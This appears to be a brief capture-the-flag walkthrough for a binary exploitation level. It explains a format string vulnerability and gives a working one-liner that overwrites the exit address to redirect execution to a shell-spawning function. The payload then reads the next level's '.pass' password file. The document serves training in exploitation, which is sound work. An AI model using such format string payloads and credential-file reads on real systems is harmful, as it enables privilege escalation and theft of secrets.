# Walkthrough

## Disassembling the executable

see source.c

## Exploit


The program is vulnerable to the format string exploit and contains a function 'o' that launches a shell as level6, but this functions is not called. This time we are rewriting the address of the exit function to jump to the function 'o'.


+ 0x8049838: offset of the modification
+ 0x080484a4 - 34 <payload size without padding> = 134513794
Divide by 3 and align to to get the padding needed


``` 
(python -c "print('\x38\x98\x04\x08 %44837942p %44837939p %44837939p %n')"; echo 'cat /home/user/level6/.pass' ) | ./level5
```
